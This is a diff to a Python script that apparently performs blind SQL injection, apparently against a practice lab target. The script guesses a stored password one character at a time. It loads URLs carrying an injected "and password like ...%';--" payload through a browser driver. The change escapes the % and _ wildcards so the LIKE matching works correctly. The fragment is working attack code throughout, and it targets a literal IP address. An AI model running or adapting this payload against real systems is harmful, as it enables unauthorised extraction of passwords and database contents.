@@ -47,7 +47,8 @@ def sql():
         while flag:
             flag = False
             for j in range(32, 127):
-                pwd_n = pwd + chr(j)
+                char = chr(j) if chr(j) != '%' and chr(j) != '_' else '[{}]'.format(chr(j))
+                pwd_n = pwd + char
                 url = 'http://35.225.46.109/sql_injection/low/id/{}%27%20and%20password%20like%20%27{}%25%27%3B--' \
                     .format(i, pwd_n)
                 driver.get(url)
